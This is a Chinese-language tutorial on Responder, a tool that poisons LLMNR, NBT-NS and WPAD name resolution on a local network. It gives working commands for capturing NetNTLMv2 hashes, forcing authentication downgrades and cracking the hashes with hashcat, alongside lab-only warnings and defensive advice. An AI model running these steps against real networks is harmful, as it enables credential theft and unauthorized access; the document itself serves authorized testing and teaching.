# Responder（名称解析投毒与凭据捕获）

> **一句话**：伪造 LLMNR / NBT-NS / mDNS 的名称解析应答，把局域网内「查找不存在主机名」的 Windows 设备引到自己这里，从而捕获 NetNTLM 哈希（并可中继利用）。
> **分类**：嗅探与欺骗 ｜ **Kali 包**：`responder` ｜ **官方文档**：<https://github.com/lgandx/Responder>

## 1. 它解决什么问题

**一个几乎每个 Windows 网络都存在的问题**：

当 Windows 尝试解析一个主机名（例如访问 `\\fileserver`）时，它按这个顺序查询：

```
1. 本地 hosts 文件
2. DNS 服务器          ← 如果 DNS 里没有这个记录
3. ⚠️ LLMNR（多播）    ← 问整个局域网「谁是 fileserver？」
4. ⚠️ NBT-NS（广播）   ← 再问一次（NetBIOS）
5. ⚠️ mDNS（多播）      ← 再问一次（Bonjour 风格）
```

**问题在于第 3~5 步**：

- 这些是**广播/多播**查询——**网段内所有人都能收到**；
- 协议**没有任何认证**——**任何设备都可以回答**；
- **Windows 在收到应答后，会自动发送凭据进行认证**（NTLM）。

所以：

```
[用户] 在某处输入 //fileserver/share  （但 fileserver 不存在，或打错了字）
        ↓
[Windows 广播] "谁是 fileserver？"
        ↓
[攻击者] "我是！我的 IP 是 192.168.1.50"
        ↓
[Windows] 自动向攻击者发送 NTLM 认证请求（含用户名 + NetNTLM 响应）
        ↓
[攻击者] 拿到 NetNTLMv2 哈希 → 离线破解，或直接中继到其他服务
```

**Responder 就是自动化这一切的工具。**

**它为什么如此有效**（历史数据表明它在内网渗透中成功率极高）：

| 原因 | 说明 |
| --- | --- |
| **不需要任何前置条件** | 不要 ARP 投毒、不需要知道目标、不需要密码 |
| **Windows 默认开启 LLMNR 和 NBT-NS** | 这是默认配置，绝大多数环境如此 |
| **用户输入错误就会触发** | 打错共享路径、访问已下线的服务器、过期的 DNS 记录… |
| **攻击面是「广播域」** | 只要你在这个网段里，就能收到所有查询 |
| **凭据可以中继利用** | 不必破解密码（见 MultiRelay） |

## 2. 工作原理

### 2.1 三个协议为什么会被滥用

| 协议 | 全称 | 端口 | 设计目的 | 缺陷 |
| --- | --- | --- | --- | --- |
| **LLMNR** | Link-Local Multicast Name Resolution | UDP **5355** | 局域网内的名称解析（无需 DNS） | **无认证、广播可见** |
| **NBT-NS** | NetBIOS Name Service | UDP **137** | NetBIOS 名称解析（更老） | **无认证、广播可见** |
| **mDNS** | Multicast DNS | UDP **5353** | Bonjour/Avahi 服务发现 | **无认证、广播可见** |

**三个协议都是「广播询问 + 任意设备应答」的模型**——这正是 Responder 利用的地方。

**关键点：Responder 只响应「解析失败的查询」**：

```
Windows 查 fileserver：
  1. hosts 文件 → 没有
  2. DNS 服务器 → 返回 NXDOMAIN（不存在）
  3. LLMNR 广播 "谁是 fileserver？"
     → 真实环境中没人回答（因为服务器下线了/名字打错了）
     → ⚠️ Responder 回答："我是！"
  4. Windows 信了，向 Responder 发起 NTLM 认证
```

**⭐ 这就是为什么 Responder 不影响正常业务**——它只劫持那些**本来就解析失败**的查询。如果某个主机名在 DNS 里能正常解析，压根不会走到 LLMNR 这一步。

**这也意味着一个重要的运营事实**：

> **Responder 的存在会「暴露」一个组织里有多少错误的/过期的名称解析请求。**
>
> 每一次命中，都意味着**某个用户打错了域名**，或者**某个 DNS 记录过期了**。这对蓝队是有价值的诊断信息（也说明用户的习惯有多「危险」）。

### 2.2 NTLM 认证的流程

Windows 的 NTLM 是**挑战-响应**协议：

```
[客户端] ──── NEGOTIATE ──────────→  [服务器]
[客户端] ←─── CHALLENGE（8 字节随机数）──  [服务器]
[客户端] ──── AUTHENTICATE ───────→  [服务器]
             （包含：
               - 用户名
               - 域名
               - 挑战的加密结果（NetNTLMv2 响应）
               - 一些用于派生密钥的随机数）
```

**⭐ 关键点**：

| 事实 | 含义 |
| --- | --- |
| 响应是**用口令派生的密钥加密挑战**的结果 | 攻击者可以拿到它 |
| **挑战是随机的**（每次不同） | **不能用彩虹表**（彩虹表只对无盐哈希有效） |
| 只能**用字典实时计算**每个候选口令的响应来比对 | 破解速度比 NTLM 哈希慢很多 |
| **NetNTLMv2 比 v1 更难破**（含更多随机数据） | Vista+ 默认用 v2 |

**NetNTLMv2 的破解成本**：

```
对每个候选口令：
  NTLM Hash = MD4(UTF-16LE(密码))
  Response  = HMAC-MD5(NTLM Hash, 服务器挑战 + 客户端随机数 + ...)
  与抓到的响应比对

一次尝试 ≈ 2 次哈希运算 + 1 次 HMAC
→ 比「破 NTLM 哈希」（1 次 MD4）慢，但仍是快速哈希
→ GPU 上仍然可以达到很高的速率
```

**⭐ 关键结论**：**NetNTLMv2 可以离线破解，但速度比破 NTLM 哈希慢**。

| 类型 | hashcat 模式 | 说明 |
| --- | --- | --- |
| **NetNTLMv1** | `-m 5500` | 老（XP/2003 或显式降级），**可被降级攻击削弱到极弱** |
| **NetNTLMv2** | `-m 5600` | Vista+ 默认，**难度取决于口令强度** |

### 2.3 Responder 的「应答服务」

Responder **不只是回答名称解析**——它还会**起一堆假的服务器**来接收认证：

| 服务 | 端口 | 作用 |
| --- | --- | --- |
| **SMB** | 445 | ⭐ **最主要的凭据来源** |
| HTTP | 80 | WPAD 代理、Web 认证 |
| HTTPS | 443 | 同上（带自签证书） |
| **WPAD 代理** | 3141 | ⭐ 让浏览器自动把认证发过来 |
| SQL Server | 1433 | — |
| FTP | 21 | — |
| IMAP | 143 | — |
| POP3 | 110 | — |
| SMTP | 25 | — |
| DNS | 53 | 伪造 DNS 应答 |
| LDAP | 389 | — |
| **Kerberos** | 88 | （配合中继使用） |

**⭐ SMB 为什么是主要的凭据来源**：Windows 在访问 `\\host` 时会**自动用当前登录凭据做 NTLM 认证**——用户甚至不需要输入任何东西。

### 2.4 WPAD —— 一个特别有效的技巧

**WPAD（Web Proxy Auto-Discovery）** 是浏览器自动发现代理配置的机制：

```
1. 浏览器启动时查询主机名 "wpad"（在本地域内）
2. 如果 DNS 里没有 wpad 记录 → 走 LLMNR/NBT-NS
3. ⚠️ Responder 回答自己是 wpad
4. 浏览器去 http://wpad/wpad.dat 下载代理配置
5. ⚠️ Responder 返回一个指向自己的代理配置
6. 此后浏览器所有流量都走 Responder 的代理 → **每次请求都带着 NTLM 认证**
```

**为什么它特别有效**：

| | 普通 LLMNR 投毒 | WPAD |
| --- | --- | --- |
| 触发条件 | 用户打错主机名 | **只要浏览器启动** |
| 凭据来源 | 偶尔发生的错误 | **持续、主动的认证** |
| 前提 | 有解析失败的查询 | **DNS 里没有 wpad 记录**（很多组织确实没有） |

**⭐ 这就是 `-w` / `--wpad` 参数的价值。** 有研究报告指出 **WPAD 是 Responder 命中率最高的模块之一**。

### 2.5 NTLM 中继（MultiRelay）—— 比破解更有效

**Responder 的 `-A`（analyze）模式只捕获哈希；但还有一个更狠的用法：中继。**

```
[受害者] ──── NTLM 认证 ───→ [Responder]  ──── 转发认证 ───→ [目标服务器]
                                  ↑
                     把受害者的认证「转」给另一台服务器
```

**如果目标服务器接受这次认证，攻击者就获得了对目标服务器的访问权——完全不需要知道密码。**

**中继成功的前提**（这些前提决定了它的可用性）：

| 前提 | 说明 |
| --- | --- |
| 目标服务**未启用 SMB 签名** | ⭐ **最关键**。签名会绑定认证到具体连接，中继就失效了 |
| 受害者有目标服务器的权限 | 通常成立的（同一域内） |
| 目标服务支持 NTLM | SMB、LDAP、MSSQL、HTTP 等 |

**⭐ 这解释了蓝队最重要的一条措施**：

> **启用 SMB 签名**是抵御 NTLM 中继最有效的手段。
>
> 而 Responder 最常见的部署方式就是**同时运行 Responder（捕获）+ ntlmrelayx/MultiRelay（中继）**。

**MultiRelay 的能力**（`responder-MultiRelay`）：

| 能力 | 说明 |
| --- | --- |
| 中继 NTLM 到目标 | `-t <目标IP>` |
| 在目标上执行命令 | 需要本地管理员权限 |
| Dump SAM | 需要管理员权限 |
| 反弹 shell | — |

**⚠️ MultiRelay 需要额外编译**（官方提示）：

```
[!]MultiRelay/bin/ folder is empty. You need to run these commands:

apt-get install gcc-mingw-w64-x86-64
x86_64-w64-mingw32-gcc ./MultiRelay/bin/Runas.c -o ./MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv
x86_64-w64-mingw32-gcc ./MultiRelay/bin/Syssvc.c -o ./MultiRelay/bin/Syssvc.exe -municode
```

**⚠️ 中继属于「主动利用」**，法律性质比单纯捕获哈希更严重。

### 2.6 配套工具

| 工具 | 作用 |
| --- | --- |
| `responder-MultiRelay` | NTLM 中继 + 命令执行 |
| `responder-RunFinger` | **指纹识别**（探测主机的 SMB 信息、是否有 SMB 签名） |
| `responder-FindSQLSrv` | 发现网络中的 SQL Server |
| `responder-DHCP_Auto` | 自动 DHCP 配置 |
| `responder-Icmp-Redirect` | ICMP 重定向（配合 MITM） |
| `responder-BrowserListener` | 浏览器监听器（老组件） |

**⭐ `responder-RunFinger` 特别值得学**——它能**提前探测哪些主机可以用中继**：

```bash
responder-RunFinger -i 192.168.1.0/24
```

**输出会显示每台主机的**：操作系统版本、主机名、**是否有 SMB 签名**。

**有 SMB 签名的主机不能中继；没有的可以。** 这让攻击者能精准选择目标。

## 3. 安装与快速上手

```bash
sudo apt install responder
responder -h
```

**快速上手（先做无害的分析模式）**：

```bash
# ⭐ 只分析不投毒（被动模式）—— 最安全的起点
sudo responder -I eth0 -A
```

**最常用的攻击命令**：

```bash
# 标准投毒（LLMNR + NBT-NS + mDNS + 一堆假服务）
sudo responder -I eth0 -v

# 加上 WPAD（命中率更高）
sudo responder -I eth0 -w -v
```

**配置文件**：

```bash
cat /etc/responder/Responder.conf
```

**关键配置项**：

```ini
[Responder Core]
; 要响应的服务
SQL = On
SMB = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On

; 挑战值（可自定义，用于区分不同测试轮次）
Challenge = 1122334455667788

[HTTP Server]
; 是否提供 wpad.dat
Serve-Exe = Off
HTMLToServe = <html>...</html>

[WPAD]
wpad.wpad_domain = wpad
```

**⭐ 每次测试用一个不同的 `Challenge` 值**——这样你能从日志里区分不同轮次的测试（也便于在报告中说明「哪次测试抓到了什么」）。

## 4. 核心参数详解

> ⚠️ **注意版本差异**：Responder 的参数在不同大版本间变化较大（例如老版本用 `-w On` 而新版本用 `-w`）。**务必以本机 `responder -h` 的输出为准。**

### 4.1 必需参数

| 参数 | 作用 | 使用建议 |
| --- | --- | --- |
| `-I <iface>` / `--interface=<iface>` | **网络接口**（必需） | ⭐ 用 `ALL` 可监听所有接口（**影响面大，慎用**） |

### 4.2 投毒控制

| 参数 | 作用 | 使用建议 |
| --- | --- | --- |
| **`-A, --analyze`** | **分析模式：只观察请求，不投毒** | ⭐⭐ **第一步必做**——先看有多少请求，评估影响 |
| `-e <IP>` / `--externalip=<IP>` | 用一个不同的 IPv4 地址投毒（而非 Responder 的本机 IP） | 配合 MITM 场景 |
| `-6 <IPv6>` / `--externalip6=<IPv6>` | 用不同的 IPv6 地址投毒 | — |
| `--rdnss` | 通过路由器通告（RA）投毒 RDNSS，把自己设为 IPv6 DNS | IPv6 场景 |
| `--dnssl=<DOMAIN>` | 通过 RA 注入 DNS 搜索后缀 | IPv6 场景 |
| `-t <HEX>` / `--ttl=<HEX>` | 设置投毒应答的 TTL（十六进制，或 `random`） | 控制缓存时间 |
| `-N <NAME>` / `--AnswerName=<NAME>` | LLMNR 应答中的规范名称（用于 Kerberos over HTTP 中继） | 高级 |

### 4.3 DHCP 相关

| 参数 | 作用 | 使用建议 |
| --- | --- | --- |
| `-d, --DHCP` | **启用 DHCPv4 投毒**（在 DHCP 应答里注入 WPAD） | ⚠️ **影响整个广播域**——所有请求 DHCP 的设备 |
| `-D, --DHCP-DNS` | 在 DHCPv4 应答里注入 DNS 服务器（而非 WPAD） | ⚠️ 同上 |
| `--dhcpv6` | 启用 DHCPv6 投毒 | ⚠️ **官方警告：可能会扰乱网络** |

**⚠️ DHCP 相关的风险**：

> `-d` / `-D` / `--dhcpv6` 会影响**所有正在请求 DHCP 的设备**（包括新上线的设备、租约续期的设备）。
> 这在授权测试中**必须明确写在 ROE 里**，且**绝不能在生产网络使用**。

### 4.4 WPAD / 代理相关

| 参数 | 作用 | 使用建议 |
| --- | --- | --- |
| **`-w, --wpad`** | **启动 WPAD 恶意代理服务器** | ⭐ **命中率很高**——很多环境没有 wpad DNS 记录 |
| `-F, --ForceWpadAuth` | 在 wpad.dat 请求时强制 NTLM/Basic 认证 | ⭐ **会弹出登录框**（可能暴露攻击） |
| `-P, --ProxyAuth` | **强制代理认证**（官方评价："Highly effective"） | ⭐ **非常有效**；不能与 `-w` 同用 |
| `-u <HOST:PORT>` / `--upstream-proxy=<HOST:PORT>` | 恶意 WPAD 代理的上游代理 | 想转发真实流量时用 |

**`-w` 与 `-P` 的区别**：

| | `-w`（WPAD） | `-P`（ProxyAuth） |
| --- | --- | --- |
| 原理 | 提供 wpad.dat 引导浏览器走代理 | 直接要求代理认证 |
| 是否弹窗 | 取决于 `-F` | 可能弹窗 |
| 官方评价 | — | **"Highly effective"** |
| 能否同时用 | ❌ 互斥 |

**⚠️ 关于 `-F` 与 `-P` 的「弹窗」**：

> 它们会在受害者屏幕上**弹出认证提示框**。
> 这有两个后果：
> 1. **用户可能起疑**（不点就抓不到）；
> 2. **这是「对用户可见的攻击」**——在授权测试中应事先说明，并注意不要干扰业务。

### 4.5 认证降级

| 参数 | 作用 | 使用建议 |
| --- | --- | --- |
| `-b, --basic` | 返回 **HTTP Basic 认证**而非 NTLM（**明文口令**） | ⭐ 直接拿到明文（但用户会看到弹窗） |
| `--lm` | 强制 LM 哈希降级（针对 Windows XP/2003） | 老系统 |
| `--disable-ess` | 禁用扩展会话安全（NTLMv1 降级） | ⚠️ **这是一个「降级攻击」** |
| `-E, --ErrorCode` | 返回 `STATUS_LOGON_FAILURE`（启用 WebDAV 认证捕获） | 强制客户端回退到 WebDAV，提高捕获成功率 |

**⭐ 关于「降级攻击」的伦理说明**：

> `--lm` / `--disable-ess` 通过**主动削弱认证强度**来提高破解成功率。
> 这属于**降低目标安全性**的行为——在授权测试中**必须在 ROE 中明确说明**，并在报告中记录。
> **不应以「规避检测」为目的使用。**

**`-E` 的原理**（值得理解）：

```
正常流程：客户端访问 SMB → 认证成功 → 结束
用 -E：  客户端访问 SMB → 返回 LOGON_FAILURE → 
         客户端自动回退到 WebDAV (HTTP) → ⚠️ Responder 在 HTTP 上捕获

为什么这更好：WebDAV 的认证不回退到 NTLMv1，且更容易捕获完整凭据
```

### 4.6 输出控制

| 参数 | 作用 | 使用建议 |
| --- | --- | --- |
| **`-v, --verbose`** | 提高详细度 | ⭐ **推荐**——能看到实时的投毒与捕获过程 |
| `-Q, --quiet` | 安静模式 | 后台运行时用 |
| `-i <IP>` / `--ip=<IP>` | 指定本机 IP（**仅 macOS**） | — |

### 4.7 配套工具的常用参数

**`responder-RunFinger`**：

| 参数 | 作用 |
| --- | --- |
| `-i <IP或CIDR>` | 目标 IP 或 C 类网段 |
| `-f <file>` | 从文件读目标列表 |
| `-t <秒>` | 连接超时（默认 0.9） |

**`responder-MultiRelay`**：

| 参数 | 作用 |
| --- | --- |
| `-t <IP>` | 中继目标（必需） |
| `-u <user>` | 只中继特定用户 |
| `-d` | 中继成功后在目标上 dump SAM |

**`responder-FindSQLSrv`** / **`responder-Icmp-Redirect`**：见各自 `-h`。

## 5. 实战演练

**环境声明**：

> **Responder 的投毒会影响整个广播域。** 以下所有操作**只能**在：
> - 你自己搭建的**完全隔离**的实验网络（host-only 虚拟网络 + 自建 Windows 虚拟机）；
> - 有**书面授权**、明确列出授权网段的渗透测试。
>
> **绝不能**在学校、公司、家庭（有家人设备）、咖啡馆等任何有他人设备的网络上运行。
>
> ⭐ **场景 1（分析模式）和场景 5（离线分析）是完全无害的，推荐从这里开始。**

**推荐的隔离实验环境**：

```
host-only 虚拟网络 192.168.56.0/24
├── Kali（攻击机，跑 Responder）
└── Windows 10 虚拟机（受害者，加入一个测试工作组/域）
    └── 目标是让它产生 LLMNR 查询（例如在资源管理器里输入 \\nonexistent）
```

### 场景 1：分析模式（完全无害，第一步必做）

**`-A` 只观察，不投毒**——它不会抢答任何查询。

```bash
sudo responder -I eth0 -A
```

**预期输出**

```
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[+] Poisoners:
    LLMNR                      [OFF]     ← ⭐ -A 模式全关
    NBT-NS                     [OFF]
    MDNS                       [OFF]
    DNS/MDNS                   [OFF]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [OFF]
    ...
    SMB server                 [OFF]
    ...

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [Off]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [ON]      ← ✅ 分析模式已开
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.56.20]
    Responder IPv6             [fe80::...]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-XXXXXXXXXXX]
    Responder Domain Name      [XXXXXXXXXX]
    Responder DCE-RPC Port     [46336]

[+] Listening for events...
```

**⭐ 关键看 `Analyze Mode [ON]` 和所有 `Poisoners [OFF]`** —— 这确认了**它不会响应任何查询**。

**观察到的输出**（受害者产生查询时）：

```
[*] [LLMNR]  Poisoned answer sent to 192.168.56.10 for name fileserver
```

**在 `-A` 模式下，应该看到的是「观察」而非「投毒」**。如果看到的是上面这种 `Poisoned answer sent`，说明**投毒没有被关闭**——检查参数。

**⭐ 这个模式的价值**：

| 用途 | 说明 |
| --- | --- |
| **评估影响** | 在投毒前，先看一个小时内有多少 LLMNR/NBT-NS 查询 |
| **诊断问题** | 找到组织里「打错域名」的用户和「过期 DNS 记录」 |
| **零风险** | 不发送任何投毒应答，完全被动 |

**⭐ 在授权测试中，「先跑 `-A` 评估影响，再决定是否投毒」是一个专业的做法**——它能让你向客户说明「这里有多少风险暴露」。

### 场景 2：标准 LLMNR/NBT-NS 投毒（核心流程）

**⚠️ 前提**：`192.168.56.0/24` 是你自己的隔离实验网络，里面只有你的 Kali 和你的 Windows 虚拟机。

**步骤 1：确认接口与网络**

```bash
ip addr show eth0 | grep inet
# inet 192.168.56.20/24

# 确认只有自己的设备
ip neigh
# 192.168.56.1  ...  (网关)
# 192.168.56.10 ...  (你的 Windows 虚拟机)
```

**⭐ 如果 `ip neigh` 里有你不认识的设备——立即停止。**

**步骤 2：启动 Responder**

```bash
sudo responder -I eth0 -w -v
```

| 参数 | 作用 |
| --- | --- |
| `-I eth0` | 接口 |
| `-w` | 启用 WPAD（提高命中率） |
| `-v` | 详细输出 |

**预期输出（启动时）**

```
[+] Poisoners:
    LLMNR                      [ON]      ← ✅ 已启用
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    SMB server                 [ON]
    ...
    WPAD proxy                 [ON]      ← w 参数生效

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [Off]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    ...

[+] Listening for events...
```

**⭐ 判读要点**：

| 配置项 | 应该是什么 |
| --- | --- |
| `LLMNR` / `NBT-NS` / `MDNS` | `[ON]`（投毒已启用） |
| `Analyze Mode` | `[OFF]`（投毒模式） |
| `SMB server` | `[ON]`（凭据主要来源） |
| `WPAD proxy` | `[ON]`（用了 `-w`） |
| `Force WPAD auth` / `Force Basic Auth` | `[OFF]`（**不强弹窗**，减少对用户的打扰） |

**步骤 3：让受害者产生查询**

在你的 Windows 虚拟机里，制造一个解析失败的名称查询：

```powershell
# 方法 A：访问不存在的主机名
# 在资源管理器地址栏输入：
\\nonexistent-server\share

# 方法 B：命令行
ping nonexistent-server
dir \\nonexistent-server\c$

# 方法 C：更真实的场景 —— 访问一个已下线服务器的共享
net use \\old-fileserver\share
```

**步骤 4：观察 Responder 的输出**

```
[*] [LLMNR]  Poisoned answer sent to 192.168.56.10 for name nonexistent-server
[SMB] NTLMv2-SSP Client   : 192.168.56.10
[SMB] NTLMv2-SSP Username : DESKTOP-ABC\user
[SMB] NTLMv2-SSP Hash     : user::DESKTOP-ABC:1122334455667788:1A2B3C4D5E6F...:0101000000000000...
```

**⭐ 逐行解读**：

| 行 | 含义 |
| --- | --- |
| `[LLMNR] Poisoned answer sent to ... for name ...` | ✅ **投毒成功**——Responder 抢答了查询 |
| `[SMB] NTLMv2-SSP Client` | ⭐ **受害者 IP**（谁上钩了） |
| `[SMB] NTLMv2-SSP Username` | ⭐ **用户名 + 域名** |
| **`[SMB] NTLMv2-SSP Hash`** | ⭐⭐ **NetNTLMv2 哈希——这就是结果** |

**⭐ 哈希的格式**：

```
user::DESKTOP-ABC:1122334455667788:1A2B3C4D5E6F...:0101000000000000...
     ↑              ↑                 ↑              ↑
   用户名          域           服务器挑战      客户端响应（含随机数）
```

**这个格式可以直接喂给 hashcat**。

**步骤 5：保存哈希并离线破解**

```bash
# Responder 默认把哈希写到日志
ls -la /usr/share/responder/logs/
# Responder-Session.log
# SMB-NTLMv2-SSP-192.168.56.10.txt     ← ⭐ 每台主机一个文件

cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.56.10.txt
```

**用 hashcat 破解**：

```bash
# NTLMv2 → -m 5600
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt \
  /usr/share/wordlists/rockyou.txt

# 查看结果
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt --show
```

**预期输出**

```
USER::DESKTOP-ABC:1122334455667788:1a2b3c...:010100...:Password123
```

**⭐ `Password123` 就是破解出的明文口令。**

**⚠️ 如果哈希是 NTLMv1（`-m 5500`），破解会快得多**——因为 NTLMv1 只有 48 位有效熵，容易被削弱到可穷尽。

### 场景 3：WPAD 投毒（命中率更高的技巧）

**前提**：受害者的 DNS 里**没有 `wpad` 记录**（很多组织确实没有）。

**步骤 1：启动 Responder（带 WPAD）**

```bash
sudo responder -I eth0 -w -v
```

**步骤 2：在受害者上打开浏览器**

**⚠️ 什么都不用做——只要打开浏览器就行。**

**步骤 3：观察输出**

```
[*] [MDNS]  Poisoned answer sent to 192.168.56.10 for name wpad
[*] [LLMNR] Poisoned answer sent to 192.168.56.10 for name wpad
[HTTP] NTLMv2-SSP Client   : 192.168.56.10
[HTTP] NTLMv2-SSP Username : DESKTOP-ABC\user
[HTTP] NTLMv2-SSP Hash     : user::DESKTOP-ABC:...
```

**⭐ 为什么会成功**：

```
1. 浏览器启动 → 想自动发现代理 → 查询主机名 "wpad"
2. DNS 里没有 wpad 记录 → 走 LLMNR/NBT-NS
3. Responder 抢答："我是 wpad"
4. 浏览器请求 http://wpad/wpad.dat
5. Responder 返回指向自己的代理配置
6. 浏览器按配置把流量发给 Responder 的代理
7. Responder 要求代理认证 → 浏览器自动发送 NTLM
8. ⭐ 捕获成功
```

**⭐ 这个攻击的可怕之处**：**受害者什么都不用做，只要打开浏览器就会触发**。

**如果你想让浏览器弹窗（强制认证）**：

```bash
# ⚠️ 会让用户看到登录框
sudo responder -I eth0 -wF -v

# 或者用 ProxyAuth（官方评价更有效）
sudo responder -I eth0 -P -v
```

**`-F` 与不加 `-F` 的区别**：

| | 不加 `-F` | 加 `-F` |
| --- | --- | --- |
| 受害者体验 | 可能静默（浏览器自动发凭据） | **弹出认证框** |
| 成功率 | 取决于浏览器配置 | 更高（但用户可能点取消） |
| 暴露风险 | 低 | ⚠️ **高**（用户会看到弹窗） |

**⭐ 实务建议**：**在授权测试中优先用不带 `-F` 的方式**（静默捕获）——它对用户干扰更小，也更隐蔽。用 `-F` 之前应确认 ROE 允许「可能对用户可见的干扰」。

### 场景 4：诊断 —— 看看组织里有多少「打错的域名」

**这是一个对蓝队有价值的用法**：用 `-A` 模式收集「哪些名称在被错误解析」。

```bash
sudo responder -I eth0 -A 2>&1 | tee /tmp/llmnr-analysis.log

# 跑一段时间后 Ctrl+C，然后分析
grep -oP 'for name \K\S+' /tmp/llmnr-analysis.log | sort | uniq -c | sort -rn | head -30
```

**预期输出**

```
  45 fileserver
  32 old-dc01
  18 printserver
  12 wpad
   8 intranet
```

**⭐ 这份统计非常有价值**：

| 发现 | 含义 | 建议 |
| --- | --- | --- |
| `fileserver` 被查了 45 次 | 有设备/用户还在访问这台已下线/改名的服务器 | 修复 DNS 记录或清理映射 |
| `old-dc01` 被查 32 次 | 有设备配置里写着旧域控 | 清理配置 |
| `wpad` 被查 12 次 | **12 次 WPAD 攻击机会** | ⭐ **要么在 DNS 里加 wpad 记录（变相防御），要么禁掉浏览器自动发现代理** |
| `intranet` 被查 8 次 | 有内部站点名称解析失败 | 修 DNS |

**⭐ 这就是「用攻击工具做防御诊断」的典型例子**——你不需要投毒，只要观察就能发现组织里有多少「可以被 Responder 利用的请求」。

**⚠️ 注意**：**即使是 `-A` 模式，也是在接收他人设备的通信信息。** 在授权范围内用；不要用它去收集非授权网段的信息。

### 场景 5：离线分析哈希（完全无害）

**如果你已经有一批 NetNTLM 哈希（比如客户提供的、或你自己实验产生的）**：

```bash
# 1) 先看哈希类型
cat hashes.txt | head -3
# user::DOMAIN:1122334455667788:1a2b3c...:010100...

# 2) 识别类型
hashcat --identify hashes.txt
# The following hash-mode matches the hash: 5600

# 3) 字典破解
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -O

# 4) 加规则（NetNTLMv2 的口令往往有规律）
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# 5) 查看结果
hashcat -m 5600 hashes.txt --show
```

**⭐ 这一步完全不需要接触任何网络**——它只是离线计算。

**如果哈希是 NTLMv1**：

```bash
hashcat -m 5500 hashes.txt /usr/share/wordlists/rockyou.txt
```

**NTLMv1 的破解线索**：NTLMv1 的响应只有 48 位有效熵，所以：

| 方式 | 说明 |
| --- | --- |
| 字典 | 首选 |
| 掩码 | `-a 3 '?a?a?a?a?a?a?a?a'` 之类（受限但可能有效） |
| **彩虹表** | NTLMv1 有公开的彩虹表（因为它被削弱了） |

**⭐ 这就是为什么「禁用 NTLMv1」是必要的**——它比 v2 弱太多。

### 场景 6：探测哪些主机可以中继（RunFinger）

**这是「准备阶段」的工具**——它帮你找到可以中继的目标。

```bash
responder-RunFinger -i 192.168.56.0/24
```

**预期输出**

```
Responder-RunFinger v1.3.3
---------------------------------------------------
IP: 192.168.56.10
Hostname: DESKTOP-ABC
OS: Windows 10 Pro
SMB Signing: Disabled         ← ⭐ 可以中继！
---------------------------------------------------
IP: 192.168.56.1
Hostname: GATEWAY
OS: Windows Server 2019
SMB Signing: Enabled          ← ❌ 不能中继
---------------------------------------------------

Total: 2
Signed: 1
Unsigned: 1
```

**⭐ `SMB Signing: Disabled` = 可以中继，`Enabled` = 不行。**

**这份输出直接告诉攻击者**：

| 信息 | 价值 |
| --- | --- |
| 哪些主机没有 SMB 签名 | **中继目标** |
| 操作系统版本 | 选择攻击方式的依据 |
| 主机名 | 构造目标列表 |

**⭐ 从蓝队角度**：**跑一次 RunFinger 就能知道组织里有多少主机没有启用 SMB 签名**——这是一个很实用的安全评估手段。

```bash
# 蓝队用法：审计 SMB 签名覆盖情况
responder-RunFinger -i <你自己的网段C类>
# 关注 "Unsigned" 的数量——这些是 NTLM 中继的风险点
```

### 场景 7：理解中继（概念演示，不实际执行）

**中继的完整链条**（这里只讲原理，不给出完整命令）：

```
1. Responder 捕获受害者的 NTLM 认证
2. 不破解，而是把这套认证「转发」给目标服务器
3. 如果目标服务器接受 → 攻击者获得对目标的访问权
4. 因为受害者有目标服务器的权限（同域），中继就会成功
```

**⚠️ 为什么本节不给命令**：

> **NTLM 中继 = 实际的未授权访问。** 它的法律性质比「捕获哈希」严重得多——捕获哈希只是「拿到了数据」，中继则是「访问了系统」。
>
> 这需要在授权书里**明确列出**允许中继的目标，以及允许在目标上做什么（只读？执行命令？Dump 凭据？）。

**关键前提（决定了它的可用性）**：

| 前提 | 说明 | 为什么重要 |
| --- | --- | --- |
| **目标未启用 SMB 签名** | ⭐⭐ **最关键** | 签名会绑定认证到具体连接，中继失效 |
| 目标启用 NTLM 认证 | — | 如果强制 Kerberos，中继失败 |
| 受害者在目标上有权限 | — | 通常成立（同域） |
| 受害者主动发起认证 | — | Responder 提供这个触发 |

**⭐ 这直接给出了防御的优先顺序**：

```
1. 启用 SMB 签名 → 中继失效（最有效）
2. 禁用 LLMNR / NBT-NS → 触发条件消失
3. 禁用 NTLM（改用 Kerberos）→ 中继目标消失
```

## 6. 输出解读

### 启动输出

| 配置项 | 含义 |
| --- | --- |
| `LLMNR [ON/OFF]` | LLMNR 投毒 |
| `NBT-NS [ON/OFF]` | NBT-NS 投毒 |
| `MDNS [ON/OFF]` | mDNS 投毒 |
| `SMB server [ON/OFF]` | SMB 假服务器（凭据主要来源） |
| `WPAD proxy [ON/OFF]` | WPAD 代理 |
| `Analyze Mode [ON/OFF]` | ⭐ **`ON` = 只观察不投毒** |
| `Force WPAD auth [ON/OFF]` | 是否强制 WPAD 认证（会弹窗） |
| `Force Basic Auth [ON/OFF]` | 是否用 HTTP Basic（明文，会弹窗） |
| `Force LM downgrade [ON/OFF]` | LM 降级 |
| `Force ESS downgrade [ON/OFF]` | NTLMv1 降级 |
